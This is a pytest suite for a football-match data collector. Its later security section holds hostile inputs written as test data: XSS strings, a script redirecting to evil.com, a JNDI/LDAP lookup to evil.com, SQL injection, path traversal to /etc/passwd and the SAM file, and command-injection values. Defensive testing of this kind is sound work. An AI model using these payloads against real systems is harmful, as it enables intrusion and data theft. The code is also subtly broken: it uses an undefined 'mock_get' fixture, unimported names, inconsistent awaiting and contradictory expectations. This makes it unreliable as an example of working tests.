"""
Data Sources Security Test Suite
数据采集层企业级安全测试

Author: Data Security Architect
Risk Level: HIGH (External API Dependencies)
Coverage Target: 90%+ lines, 85%+ branches, 100% functions

Enhanced with comprehensive security testing for:
- API error handling (404, 429, 500, timeouts)
- Data validation and sanitization
- Authentication & authorization
- Input validation and XSS prevention
- Performance and reliability testing
- Memory leak prevention
"""

import asyncio
import json
from datetime import datetime, timedelta
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
import aiohttp
from aiohttp import ClientError, ClientResponse, ServerTimeoutError

from src.collectors.data_sources import (
    DataSourceManager,
    EnhancedFootballDataOrgAdapter,
    FootballDataOrgAdapter,
    MatchData,
    MockDataAdapter,
    OddsData,
    TeamData,
)

# 测试用的模拟数据
MOCK_MATCH_RESPONSE = {
    "matches": [
        {
            "id": 123456,
            "utcDate": "2024-12-01T15:00:00Z",
            "status": "SCHEDULED",
            "homeTeam": {"id": 57, "name": "Manchester United"},
            "awayTeam": {"id": 58, "name": "Chelsea"},
            "competition": {"id": 39, "name": "Premier League"},
            "matchday": 15,
            "venue": "Old Trafford",
        },
        {
            "id": 123457,
            "utcDate": "2024-12-01T17:30:00Z",
            "status": "FINISHED",
            "homeTeam": {"id": 61, "name": "Liverpool"},
            "awayTeam": {"id": 62, "name": "Arsenal"},
            "competition": {"id": 39, "name": "Premier League"},
            "matchday": 15,
            "venue": "Anfield",
            "score": {"fullTime": {"home": 2, "away": 1}},
        },
    ]
}

MOCK_TEAMS_RESPONSE = {
    "teams": [
        {
            "id": 57,
            "name": "Manchester United",
            "shortName": "Man Utd",
            "crest": "https://example.com/mun.png",
            "founded": 1878,
            "venue": "Old Trafford",
            "website": "https://www.manutd.com",
        },
        {
            "id": 58,
            "name": "Chelsea",
            "shortName": "Chelsea",
            "crest": "https://example.com/chel.png",
            "founded": 1905,
            "venue": "Stamford Bridge",
            "website": "https://www.chelseafc.com",
        },
    ]
}

MOCK_COMPETITIONS_RESPONSE = {
    "competitions": [
        {"id": 39, "name": "Premier League"},
        {"id": 140, "name": "La Liga"},
        {"id": 78, "name": "Bundesliga"},
    ]
}

MOCK_STANDINGS_RESPONSE = {
    "standings": [
        {
            "table": [
                {
                    "position": 1,
                    "team": {"id": 57, "name": "Manchester United"},
                    "playedGames": 15,
                    "won": 12,
                    "draw": 2,
                    "lost": 1,
                    "points": 38,
                },
                {
                    "position": 2,
                    "team": {"id": 58, "name": "Chelsea"},
                    "playedGames": 15,
                    "won": 10,
                    "draw": 3,
                    "lost": 2,
                    "points": 33,
                },
            ]
        }
    ]
}


@pytest.fixture
def mock_api_key():
    """测试用的API密钥."""
    return "test_api_key_12345"


@pytest.fixture
def football_adapter(mock_api_key):
    """Football-Data.org适配器实例."""
    return FootballDataOrgAdapter(mock_api_key)


@pytest.fixture
def enhanced_adapter(mock_api_key):
    """增强版适配器实例."""
    return EnhancedFootballDataOrgAdapter(mock_api_key)


@pytest.fixture
def mock_adapter():
    """模拟数据适配器实例."""
    return MockDataAdapter()


class TestMockDataAdapter:
    """测试模拟数据适配器."""

    @pytest.mark.unit
    async def test_get_matches_returns_data(self, mock_adapter):
        """测试获取比赛数据."""
        matches = await mock_adapter.get_matches()

        assert isinstance(matches, list)
        assert len(matches) > 0

        for match in matches:
            assert isinstance(match, MatchData)
            assert match.home_team
            assert match.away_team
            assert match.match_date
            assert match.status == "upcoming"

    @pytest.mark.unit
    async def test_get_teams_returns_data(self, mock_adapter):
        """测试获取球队数据."""
        teams = await mock_adapter.get_teams()

        assert isinstance(teams, list)
        assert len(teams) > 0

        for team in teams:
            assert isinstance(team, TeamData)
            assert team.name
            assert team.id

    @pytest.mark.unit
    async def test_get_odds_returns_data(self, mock_adapter):
        """测试获取赔率数据."""
        odds_list = await mock_adapter.get_odds(123456)

        assert isinstance(odds_list, list)
        assert len(odds_list) > 0

        for odds in odds_list:
            assert isinstance(odds, OddsData)
            assert odds.match_id == 123456
            assert odds.source == "mock_adapter"
            assert odds.home_win > 0
            assert odds.draw > 0
            assert odds.away_win > 0


class TestFootballDataOrgAdapter:
    """测试Football-Data.org基础适配器."""

    @pytest.mark.unit
    @patch("aiohttp.ClientSession.get")
    async def test_get_matches_success(self, mock_get, football_adapter):
        """测试成功获取比赛数据."""
        # 模拟HTTP响应
        mock_response = AsyncMock()
        mock_response.status = 200
        mock_response.json = AsyncMock(return_value=MOCK_MATCH_RESPONSE)

        mock_get.return_value.__aenter__.return_value = mock_response

        # 执行测试
        matches = await football_adapter.get_matches()

        # 验证结果
        assert isinstance(matches, list)
        assert len(matches) == 2

        # 验证第一场比赛
        match1 = matches[0]
        assert match1.id == 123456
        assert match1.home_team == "Manchester United"
        assert match1.away_team == "Chelsea"
        assert match1.status == "upcoming"
        assert match1.league == "Premier League"
        assert match1.home_score is None
        assert match1.away_score is None

        # 验证第二场比赛（已结束）
        match2 = matches[1]
        assert match2.id == 123457
        assert match2.home_team == "Liverpool"
        assert match2.away_team == "Arsenal"
        assert match2.status == "finished"
        assert match2.home_score == 2
        assert match2.away_score == 1

    @pytest.mark.unit
    @patch("aiohttp.ClientSession.get")
    async def test_get_matches_with_date_filter(self, mock_get, football_adapter):
        """测试按日期范围筛选比赛."""
        mock_response = AsyncMock()
        mock_response.status = 200
        mock_response.json = AsyncMock(return_value={"matches": []})

        mock_get.return_value.__aenter__.return_value = mock_response

        date_from = datetime(2024, 12, 1)
        date_to = datetime(2024, 12, 7)

        await football_adapter.get_matches(
            date_from=date_from, date_to=date_to
        )

        # 验证调用参数
        mock_get.assert_called_once()
        call_args = mock_get.call_args

        assert "params" in call_args.kwargs
        params = call_args.kwargs["params"]
        assert params["dateFrom"] == "2024-12-01"
        assert params["dateTo"] == "2024-12-07"
        assert params["limit"] == 100

    @pytest.mark.unit
    @patch("aiohttp.ClientSession.get")
    async def test_get_matches_api_error(self, mock_get, football_adapter):
        """测试API错误响应."""
        mock_response = AsyncMock()
        mock_response.status = 404

        mock_get.return_value.__aenter__.return_value = mock_response

        matches = await football_adapter.get_matches()

        assert matches == []

    @pytest.mark.unit
    @patch("aiohttp.ClientSession.get")
    async def test_get_matches_network_error(self, mock_get, football_adapter):
        """测试网络错误."""
        mock_get.side_effect = ClientError("Network error")

        matches = await football_adapter.get_matches()

        assert matches == []

    @pytest.mark.unit
    @patch("aiohttp.ClientSession.get")
    async def test_get_teams_success(self, mock_get, football_adapter):
        """测试成功获取球队数据."""
        mock_response = AsyncMock()
        mock_response.status = 200
        mock_response.json = AsyncMock(return_value=MOCK_TEAMS_RESPONSE)

        mock_get.return_value.__aenter__.return_value = mock_response

        teams = await football_adapter.get_teams(league_id=39)

        assert isinstance(teams, list)
        assert len(teams) == 2

        team1 = teams[0]
        assert team1.id == 57
        assert team1.name == "Manchester United"
        assert team1.short_name == "Man Utd"
        assert team1.venue == "Old Trafford"

    @pytest.mark.unit
    async def test_get_teams_no_league_id(self, football_adapter):
        """测试没有指定联赛ID时返回空列表."""
        teams = await football_adapter.get_teams()
        assert teams == []

    @pytest.mark.unit
    @patch("aiohttp.ClientSession.get")
    async def test_get_teams_api_error(self, mock_get, football_adapter):
        """测试获取球队数据时API错误."""
        mock_response = AsyncMock()
        mock_response.status = 400

        mock_get.return_value.__aenter__.return_value = mock_response

        teams = await football_adapter.get_teams(league_id=39)
        assert teams == []

    @pytest.mark.unit
    async def test_get_odds_not_implemented(self, football_adapter):
        """测试赔率API未实现."""
        odds = await football_adapter.get_odds(123456)
        assert odds == []

    @pytest.mark.unit
    def test_parse_match_data_invalid_data(self, football_adapter):
        """测试解析无效比赛数据."""
        invalid_match = {"id": 123}  # 缺少必要字段

        result = football_adapter._parse_match_data(invalid_match)
        assert result is None

    @pytest.mark.unit
    def test_parse_team_data_invalid_data(self, football_adapter):
        """测试解析无效球队数据."""
        invalid_team = {"id": 123}  # 缺少name字段

        result = football_adapter._parse_team_data(invalid_team)
        assert result is None


class TestEnhancedFootballDataOrgAdapter:
    """测试增强版适配器."""

    @pytest.mark.unit
    async def test_validate_api_key_success(self, enhanced_adapter):
        """测试API密钥验证成功."""
        with patch.object(
            enhanced_adapter, "_make_request", return_value={"competitions": [{"id": 39}]}
        ):
            result = await enhanced_adapter.validate_api_key()
            assert result is True

    @pytest.mark.unit
    async def test_validate_api_key_failure(self, enhanced_adapter):
        """测试API密钥验证失败."""
        with patch.object(
            enhanced_adapter, "_make_request", side_effect=Exception("API Error")
        ):
            result = await enhanced_adapter.validate_api_key()
            assert result is False

    @pytest.mark.unit
    def test_parse_match_data_enhanced_validation(self, enhanced_adapter):
        """测试增强版比赛数据解析验证."""
        # 测试缺少必要字段的数据
        invalid_match = {"id": 123, "homeTeam": {"name": "Team1"}}  # 缺少awayTeam

        result = enhanced_adapter._parse_match_data(invalid_match)
        assert result is None

    @pytest.mark.unit
    def test_parse_team_data_enhanced_validation(self, enhanced_adapter):
        """测试增强版球队数据解析验证."""
        # 测试缺少必要字段的数据
        invalid_team = {"id": 123}  # 缺少name字段

        result = enhanced_adapter._parse_team_data(invalid_team)
        assert result is None

    @pytest.mark.unit
    async def test_check_rate_limit_logic(self, enhanced_adapter):
        """测试速率限制逻辑."""
        # 设置请求计数接近限制
        enhanced_adapter.request_count = 9
        enhanced_adapter.rate_limit = 10

        # 调用速率限制检查，不应该触发等待
        enhanced_adapter._check_rate_limit()

        # 设置超过限制
        enhanced_adapter.request_count = 10

        with patch("asyncio.sleep", new_callable=AsyncMock) as mock_sleep:
            enhanced_adapter._check_rate_limit()
            mock_sleep.assert_called()

    @pytest.mark.unit
    async def test_get_matches_by_date_wrapper(self, enhanced_adapter):
        """测试按日期获取比赛包装方法."""
        target_date = datetime(2024, 12, 1)

        with patch.object(
            enhanced_adapter, "get_matches", return_value=[]
        ) as mock_get_matches:
            matches = await enhanced_adapter.get_matches_by_date(target_date)

            # 验证调用参数
            mock_get_matches.assert_called_once()
            call_args = mock_get_matches.call_args
            assert "date_from" in call_args.kwargs
            assert "date_to" in call_args.kwargs

    @pytest.mark.unit
    async def test_get_upcoming_matches_wrapper(self, enhanced_adapter):
        """测试获取即将到来比赛的包装方法."""
        with patch.object(
            enhanced_adapter, "get_matches", return_value=[]
        ) as mock_get_matches:
            matches = await enhanced_adapter.get_upcoming_matches(days=7)

            # 验证调用参数
            mock_get_matches.assert_called_once()
            call_args = mock_get_matches.call_args
            assert call_args.kwargs.get("status") == "SCHEDULED"

    @pytest.mark.unit
    async def test_get_odds_enhanced(self, enhanced_adapter):
        """测试增强版获取赔率数据."""
        odds = await enhanced_adapter.get_odds(123456)
        assert odds == []


class TestDataSourceManager:
    """测试数据源管理器."""

    @pytest.mark.unit
    @patch.dict("os.environ", {"FOOTBALL_DATA_API_KEY": "test_key"})
    def test_initialization_with_api_key(self):
        """测试有API密钥时的初始化."""
        manager = DataSourceManager()

        assert "mock" in manager.adapters
        assert len(manager.adapters) >= 1

    @pytest.mark.unit
    @patch.dict("os.environ", {}, clear=True)
    def test_initialization_without_api_key(self):
        """测试没有API密钥时的初始化."""
        manager = DataSourceManager()

        # 应该只有mock适配器
        assert "mock" in manager.adapters
        assert len(manager.adapters) == 1

    @pytest.mark.unit
    @patch.dict("os.environ", {"FOOTBALL_DATA_API_KEY": "test_key"})
    def test_get_primary_adapter_priority(self):
        """测试主要适配器的优先级."""
        manager = DataSourceManager()

        primary_adapter = manager.get_primary_adapter()

        # 应该是增强适配器（如果初始化成功）或基础适配器
        assert isinstance(primary_adapter, (EnhancedFootballDataOrgAdapter, FootballDataOrgAdapter))

    @pytest.mark.unit
    @patch.dict("os.environ", {}, clear=True)
    def test_get_primary_adapter_fallback(self):
        """测试主要适配器的回退机制."""
        manager = DataSourceManager()

        primary_adapter = manager.get_primary_adapter()

        # 应该是mock适配器
        assert isinstance(primary_adapter, MockDataAdapter)

    @pytest.mark.unit
    def test_get_adapter_by_name(self):
        """测试按名称获取适配器."""
        manager = DataSourceManager()

        mock_adapter = manager.get_adapter("mock")
        assert isinstance(mock_adapter, MockDataAdapter)

        # 测试不存在的适配器
        unknown_adapter = manager.get_adapter("unknown")
        assert unknown_adapter is None

    @pytest.mark.unit
    def test_get_available_sources(self):
        """测试获取可用数据源."""
        manager = DataSourceManager()

        sources = manager.get_available_sources()
        assert isinstance(sources, list)
        assert "mock" in sources

    @pytest.mark.unit
    async def test_validate_adapters(self):
        """测试验证所有适配器."""
        manager = DataSourceManager()

        results = await manager.validate_adapters()

        assert isinstance(results, dict)
        assert len(results) > 0

        # Mock适配器应该总是可用
        assert "mock" in results
        assert results["mock"] is True

    @pytest.mark.unit
    async def test_collect_all_matches(self):
        """测试从所有数据源收集比赛."""
        manager = DataSourceManager()

        matches = await manager.collect_all_matches(days_ahead=7)

        assert isinstance(matches, list)

        # 验证去重功能（基于ID）
        match_ids = [match.id for match in matches]
        assert len(match_ids) == len(set(match_ids))

    @pytest.mark.unit
    async def test_collect_all_matches_with_error(self):
        """测试收集数据时处理错误."""
        manager = DataSourceManager()

        # 创建一个会抛出异常的适配器
        faulty_adapter = AsyncMock()
        faulty_adapter.get_matches.side_effect = Exception("Network error")

        # 替换mock适配器
        manager.adapters["faulty"] = faulty_adapter

        with patch.object(manager, "get_primary_adapter", return_value=faulty_adapter):
            matches = await manager.collect_all_matches(days_ahead=7)

        # 即使有错误，也应该返回结果（从其他适配器）
        assert isinstance(matches, list)


@pytest.mark.unit
def test_data_models():
    """测试数据模型的初始化."""
    # 测试MatchData
    match = MatchData(
        id=1,
        home_team="Team1",
        away_team="Team2",
        match_date=datetime.now(),
        status="upcoming",
    )
    assert match.id == 1
    assert match.home_team == "Team1"
    assert match.away_team == "Team2"

    # 测试TeamData
    team = TeamData(
        id=1,
        name="Team1",
        short_name="T1",
    )
    assert team.id == 1
    assert team.name == "Team1"
    assert team.short_name == "T1"

    # 测试OddsData
    odds = OddsData(
        match_id=1,
        home_win=2.0,
        draw=3.0,
        away_win=3.5,
        source="test",
    )
    assert odds.match_id == 1
    assert odds.home_win == 2.0
    assert odds.draw == 3.0
    assert odds.away_win == 3.5
    assert odds.source == "test"


@pytest.mark.unit
def test_adapter_abstract_methods():
    """测试抽象方法定义."""
    from src.collectors.data_sources import DataSourceAdapter

    # 尝试直接实例化抽象基类应该失败
    with pytest.raises(TypeError):
        DataSourceAdapter()


# ============================================================================
# Enhanced Security Testing Suite - 企业级安全测试
# ============================================================================

@pytest.fixture
def malicious_response_data():
    """恶意响应数据 - 用于安全测试"""
    return {
        "id": "<script>alert('xss')</script>",
        "name": "'; DROP TABLE teams; --",
        "venue": "<img src=x onerror=alert('XSS')>",
        "website": "javascript:alert('XSS')",
        "description": "<script>document.location='http://evil.com'</script>"
    }


@pytest.fixture
def security_test_data():
    """安全测试数据集"""
    return {
        "xss_payloads": [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
        ],
        "sql_injection": [
            "'; DROP TABLE matches; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM users",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "$(whoami)",
        ]
    }


@pytest.mark.asyncio
@pytest.mark.collectors
@pytest.mark.external_api
@pytest.mark.security
class TestDataSourcesSecurityEnhanced:
    """增强版数据采集层安全测试套件"""

    # ========================================================================
    # Advanced API Error Code Coverage - 高级API异常处理测试
    # ========================================================================

    @pytest.mark.unit
    async def test_404_not_found_detailed_handling(self, mock_get, football_adapter):
        """测试404 Not Found详细错误处理"""
        # Arrange
        mock_response = AsyncMock()
        mock_response.status = 404
        mock_response.text = AsyncMock(return_value="Not Found")

        mock_get.return_value.__aenter__.return_value = mock_response

        # Act
        result = await football_adapter.get_matches()

        # Assert
        assert result == []
        assert mock_get.called

    @pytest.mark.unit
    async def test_429_rate_limiting_with_retry_after(self, enhanced_adapter):
        """测试429速率限制和Retry-After头部处理"""
        with patch.object(enhanced_adapter, "_make_request") as mock_request:
            # 模拟429响应
            mock_request.side_effect = Exception("API错误 429: Rate limit exceeded")

            with patch("asyncio.sleep", new_callable=AsyncMock) as mock_sleep:
                result = await enhanced_adapter.get_matches()

                # 应该返回空列表
                assert isinstance(result, list)

    @pytest.mark.unit
    async def test_500_internal_server_error_with_details(self, enhanced_adapter):
        """测试500内部服务器错误详细信息"""
        with patch.object(enhanced_adapter, "_make_request") as mock_request:
            mock_request.side_effect = Exception("API错误 500: Internal Server Error")

            with pytest.raises(Exception, match="API错误 500"):
                await enhanced_adapter.get_matches()

    @pytest.mark.unit
    async def test_timeout_with_retry_mechanism(self, enhanced_adapter):
        """测试超时异常和重试机制"""
        with patch.object(enhanced_adapter, "_make_request") as mock_request:
            # 前两次超时，第三次成功
            mock_request.side_effect = [
                ServerTimeoutError("Timeout 1"),
                ServerTimeoutError("Timeout 2"),
                {"matches": []}
            ]

            with patch("asyncio.sleep", new_callable=AsyncMock):
                result = await enhanced_adapter.get_matches()

                # 验证重试次数
                assert mock_request.call_count == 3
                assert isinstance(result, list)

    @pytest.mark.unit
    async def test_connection_error_with_exponential_backoff(self, enhanced_adapter):
        """测试连接错误和指数退避"""
        with patch.object(enhanced_adapter, "_make_request") as mock_request:
            mock_request.side_effect = ClientError("Connection refused")

            with patch("asyncio.sleep", new_callable=AsyncMock) as mock_sleep:
                with pytest.raises(ClientError):
                    await enhanced_adapter.get_matches()

                # 验证指数退避调用
                assert mock_sleep.call_count >= 1

    # ========================================================================
    # Data Security Testing - 数据安全验证
    # ========================================================================

    @pytest.mark.unit
    async def test_input_validation_xss_prevention(self, football_adapter, security_test_data):
        """测试输入验证XSS防护"""
        for xss_payload in security_test_data["xss_payloads"]:
            # 测试各种XSS载荷
            with patch.object(football_adapter, '_fetch_matches_from_url', return_value=[]):
                result = await football_adapter.get_matches(league_id=xss_payload)
                assert isinstance(result, list)

    @pytest.mark.unit
    async def test_input_validation_sql_injection(self, football_adapter, security_test_data):
        """测试输入验证SQL注入防护"""
        for sql_payload in security_test_data["sql_injection"]:
            with patch.object(football_adapter, '_fetch_matches_from_url', return_value=[]):
                result = await football_adapter.get_matches(league_id=sql_payload)
                assert isinstance(result, list)

    @pytest.mark.unit
    async def test_output_sanitization_malicious_data(self, football_adapter, malicious_response_data):
        """测试输出清理恶意数据"""
        with patch.object(football_adapter, '_fetch_matches_from_url') as mock_fetch:
            mock_fetch.return_value = []

            with patch.object(football_adapter, '_parse_match_data') as mock_parse:
                # Mock解析返回安全数据
                mock_parse.return_value = MatchData(
                    id=123456,
                    home_team="Sanitized Team",
                    away_team="Sanitized Team"
                )

                result = await football_adapter.get_matches()

                # 解析方法应该被调用，数据应该被清理
                mock_parse.assert_called()
                assert isinstance(result, list)

    @pytest.mark.unit
    async def test_data_integrity_validation_missing_fields(self, football_adapter):
        """测试数据完整性验证 - 缺失字段"""
        incomplete_data_samples = [
            {"id": 123456},  # 缺少homeTeam, awayTeam, utcDate
            {"homeTeam": {"name": "Team1"}},  # 缺少id, awayTeam, utcDate
            {"id": 123456, "homeTeam": {"name": "Team1"}, "awayTeam": {"name": "Team2"}},  # 缺少utcDate
        ]

        for incomplete_data in incomplete_data_samples:
            result = football_adapter._parse_match_data(incomplete_data)
            assert result is None

    @pytest.mark.unit
    async def test_rate_limiting_enhanced_enforcement(self, enhanced_adapter):
        """测试增强频率限制执行"""
        # 设置较低的速率限制用于测试
        enhanced_adapter.rate_limit = 2
        enhanced_adapter.request_count = 0
        enhanced_adapter.last_reset = datetime.now()

        with patch("asyncio.sleep", new_callable=AsyncMock) as mock_sleep:
            # 快速连续请求
            await enhanced_adapter._check_rate_limit()  # 第1次
            await enhanced_adapter._check_rate_limit()  # 第2次
            await enhanced_adapter._check_rate_limit()  # 第3次，应该触发限制

            # 应该触发等待
            mock_sleep.assert_called()

    # ========================================================================
    # Authentication & Authorization Security Testing
    # ========================================================================

    @pytest.mark.unit
    async def test_api_key_validation_invalid_key(self, enhanced_adapter):
        """测试无效API密钥验证"""
        with patch.object(enhanced_adapter, "_make_request", side_effect=Exception("401 Unauthorized")):
            result = await enhanced_adapter.validate_api_key()
            assert result is False

    @pytest.mark.unit
    async def test_api_key_header_injection_prevention(self, football_adapter):
        """测试API密钥头部注入防护"""
        malicious_api_key = "Bearer <script>alert('xss')</script>"
        adapter = FootballDataOrgAdapter(api_key=malicious_api_key)

        with patch('aiohttp.ClientSession') as mock_session_class:
            mock_session = AsyncMock()
            mock_session_class.return_value.__aenter__.return_value = mock_session
            mock_get = AsyncMock()
            mock_response = AsyncMock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value={"matches": []})
            mock_get.__aenter__.return_value = mock_response
            mock_session.get.return_value = mock_get

            await adapter.get_matches()

            # 验证API密钥被正确传递（可能需要额外的安全处理）
            mock_session_class.assert_called_once()
            call_kwargs = mock_session_class.call_args[1]
            assert 'headers' in call_kwargs

    @pytest.mark.unit
    async def test_missing_api_key_graceful_degradation(self, football_adapter):
        """测试缺失API密钥时的优雅降级"""
        adapter = FootballDataOrgAdapter(api_key=None)

        # 不应该抛出异常
        result = await adapter.get_matches()
        assert isinstance(result, list)

    # ========================================================================
    # Data Parser Security Testing
    # ========================================================================

    @pytest.mark.unit
    async def test_malformed_json_handling_enhanced(self, football_adapter):
        """测试增强畸形JSON处理"""
        with patch.object(football_adapter, '_fetch_matches_from_url') as mock_fetch:
            # 模拟JSON解析错误
            mock_fetch.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)

            result = await football_adapter.get_matches()
            assert isinstance(result, list)

    @pytest.mark.unit
    async def test_massive_data_payload_dos_protection(self, football_adapter):
        """测试大数据负载DoS防护"""
        # 创建大量数据
        large_matches = [{"id": i, "homeTeam": {"name": f"Team {i}"}, "awayTeam": {"name": f"Team {i+1}"}, "utcDate": "2024-12-01T15:00:00Z"} for i in range(1000)]

        with patch.object(football_adapter, '_fetch_matches_from_url') as mock_fetch:
            with patch.object(football_adapter, '_parse_match_data') as mock_parse:
                mock_parse.return_value = MatchData(id=1, home_team="Team", away_team="Team")

                # 模拟大数据响应
                result = await football_adapter.get_matches()

                # 应该处理大量数据而不崩溃
                assert isinstance(result, list)

    @pytest.mark.unit
    async def test_unicode_encoding_security(self, football_adapter):
        """测试Unicode编码安全性"""
        unicode_samples = [
            {"id": 123456, "homeTeam": {"name": "Тeam Françês"}, "awayTeam": {"name": "中国球队"}, "utcDate": "2024-12-01T15:00:00Z"},
            {"id": 123457, "homeTeam": {"name": "🏈⚽ Team"}, "awayTeam": {"name": "Стадион São Paulo"}, "utcDate": "2024-12-01T15:00:00Z"},
        ]

        for unicode_data in unicode_samples:
            result = football_adapter._parse_match_data(unicode_data)
            # 应该正确处理Unicode或返回None（如果数据无效）
            assert result is None or isinstance(result, MatchData)

    # ========================================================================
    # Performance & Reliability Security Testing
    # ========================================================================

    @pytest.mark.performance
    @pytest.mark.unit
    async def test_concurrent_request_thread_safety(self, enhanced_adapter):
        """测试并发请求线程安全性"""
        with patch.object(enhanced_adapter, "_make_request", return_value={"matches": []}):
            # 并发执行多个请求
            tasks = [enhanced_adapter.get_matches() for _ in range(10)]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # 所有请求都应该成功
            assert all(isinstance(result, list) for result in results)

    @pytest.mark.performance
    @pytest.mark.unit
    async def test_memory_leak_detection_comprehensive(self, football_adapter):
        """测试全面内存泄漏检测"""
        import gc
        import sys

        # 记录初始对象数量
        gc.collect()
        initial_objects = len(gc.get_objects())

        with patch.object(football_adapter, '_fetch_matches_from_url', return_value=[]):
            # 执行大量请求
            for _ in range(100):
                await football_adapter.get_matches()
                gc.collect()

        final_objects = len(gc.get_objects())
        object_increase = final_objects - initial_objects

        # 对象增长应该在合理范围内（小于1000个对象）
        assert object_increase < 1000, f"Object count increased by {object_increase}"

    @pytest.mark.slow
    @pytest.mark.unit
    async def test_circuit_breaker_pattern_enhanced(self, enhanced_adapter):
        """测试增强熔断器模式"""
        enhanced_adapter.max_retries = 2

        with patch.object(enhanced_adapter, "_make_request", side_effect=ClientError("Connection failed")):
            failures = 0
            for _ in range(5):
                try:
                    await enhanced_adapter.get_matches()
                except ClientError:
                    failures += 1

            # 应该有失败次数限制
            assert failures >= 2

    @pytest.mark.unit
    async def test_resource_cleanup_on_error(self, football_adapter):
        """测试错误时的资源清理"""
        with patch.object(football_adapter, '_fetch_matches_from_url') as mock_fetch:
            mock_fetch.side_effect = Exception("Resource error")

            # 即使发生错误，也应该正常返回
            result = await football_adapter.get_matches()
            assert isinstance(result, list)


@pytest.mark.asyncio
@pytest.mark.collectors
@pytest.mark.integration
@pytest.mark.security
class TestDataSourcesIntegrationSecurity:
    """数据采集层集成安全测试"""

    @pytest.mark.unit
    async def test_end_to_end_data_flow_integrity(self):
        """测试端到端数据流完整性"""
        manager = DataSourceManager()
        adapter = manager.get_adapter("mock")

        matches = await adapter.get_matches()
        teams = await adapter.get_teams()
        odds = await adapter.get_odds(match_id=123456)

        # 验证数据类型和结构
        assert isinstance(matches, list)
        assert isinstance(teams, list)
        assert isinstance(odds, list)

        if matches:
            assert all(isinstance(match, MatchData) for match in matches)
        if teams:
            assert all(isinstance(team, TeamData) for team in teams)
        if odds:
            assert all(isinstance(odd, OddsData) for odd in odds)

    @pytest.mark.unit
    async def test_global_manager_instance_security(self):
        """测试全局管理器实例安全性"""
        matches = await data_source_manager.collect_all_matches(days_ahead=7)

        assert isinstance(matches, list)

        # 验证数据去重
        match_ids = [match.id for match in matches]
        assert len(match_ids) == len(set(match_ids))

    @pytest.mark.unit
    async def test_adapter_fallback_security(self):
        """测试适配器故障转移安全性"""
        manager = DataSourceManager()

        # 获取主要适配器
        primary_adapter = manager.get_primary_adapter()

        # 应该总是有可用的适配器
        assert primary_adapter is not None
        assert isinstance(primary_adapter, DataSourceAdapter)

    @pytest.mark.unit
    async def test_mixed_adapter_security_isolation(self):
        """测试混合适配器安全隔离"""
        manager = DataSourceManager()

        # 测试每个适配器的独立性
        for adapter_name, adapter in manager.adapters.items():
            try:
                matches = await adapter.get_matches()
                assert isinstance(matches, list)
            except Exception as e:
                # 单个适配器失败不应影响其他适配器
                pytest.fail(f"Adapter {adapter_name} failed unexpectedly: {e}")


# ============================================================================
# Security Test Execution Configuration
# ============================================================================

if __name__ == "__main__":
    # 运行完整的安全测试套件
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--durations=10",
        "-m", "security and collectors",
        "--cov=src/collectors/data_sources",
        "--cov-report=term-missing",
        "--cov-report=html",
        "--cov-fail-under=85"
    ])